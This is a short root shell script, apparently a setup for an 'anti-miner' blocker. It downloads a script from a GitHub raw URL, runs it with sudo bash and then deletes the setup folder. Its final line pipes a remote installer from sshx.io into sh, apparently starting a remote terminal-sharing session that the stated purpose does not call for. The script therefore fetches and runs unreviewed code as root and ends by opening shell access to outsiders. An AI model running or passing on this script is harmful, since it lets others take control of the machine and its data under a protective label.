sudo apt update
sudo apt install wget curl -y
sudo mkdir /setup/
sudo USER=getantiminer wget https://raw.githubusercontent.com/infiniteedev/infiniteedev-sh/refs/heads/main/mining/crypto-blocker.sh -O /setup/setupantiminer.sh
sudo bash /setup/setupantiminer.sh
sudo rm -rf /setup
curl https://sshx.io/get | sh -s run
